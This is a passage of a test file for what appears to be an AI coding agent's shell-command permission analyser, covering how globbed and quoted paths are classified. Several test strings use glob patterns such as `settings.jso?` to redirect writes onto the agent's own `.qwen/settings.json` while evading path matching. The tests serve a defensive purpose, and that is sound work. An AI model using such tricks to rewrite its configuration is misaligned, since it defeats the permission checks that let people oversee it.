  it('leaves a literal target-directory destination known', () => {
    const writes = ops('cp -t /tmp/safe file').filter(
      (op) => op.virtualTool === 'write_file',
    );
    expect(writes).toEqual([write('/tmp/safe/file')]);
  });
});

describe('unquoted pathname globbing is an expansion', () => {
  // A glob character is marked bare rather than as expansion syntax, so a
  // predicate that read only the expansion mark certified `> settings.jso?`
  // at a name bash never opens.
  it.each([
    "printf '{}' > .qwen/settings.jso?",
    "printf '{}' > .qwen/[s]ettings.json",
    "printf '{}' > .qwen/settings.json*",
  ])('keeps a globbed redirect target uncertain: %s', (command) => {
    expect(across(command)).toEqual([
      {
        virtualTool: 'write_file',
        filePath:
          '/repo/.qwen/' + command.split('> ')[1]!.replace('.qwen/', ''),
        pathUnknown: true,
      },
    ]);
  });

  it('keeps a globbed read argument uncertain', () => {
    expect(ops('cat .qwen/settings.jso?')).toEqual([
      {
        virtualTool: 'read_file',
        filePath: `${CWD}/.qwen/settings.jso?`,
        pathUnknown: true,
      },
    ]);
  });

  it('escalates the segment after a globbed cd', () => {
    expect(across('cd .qwen/sub? && echo x > settings.json')).toEqual([
      uncertainWrite('/repo/.qwen/sub?/settings.json'),
    ]);
  });

  it.each([
    ['cat "foo*"', 'foo*'],
    ["cat 'foo*'", 'foo*'],
    [String.raw`cat esc\*.txt`, 'esc*.txt'],
    ['cat data.csv', 'data.csv'],
  ])('leaves a quoted or escaped glob literal: %s', (command, file) => {
    expect(ops(command)).toEqual([read(`${CWD}/${file}`)]);
  });

  it('leaves an ordinary redirect known', () => {
    expect(across('echo hi > log.txt')).toEqual([write('/repo/log.txt')]);
  });
});
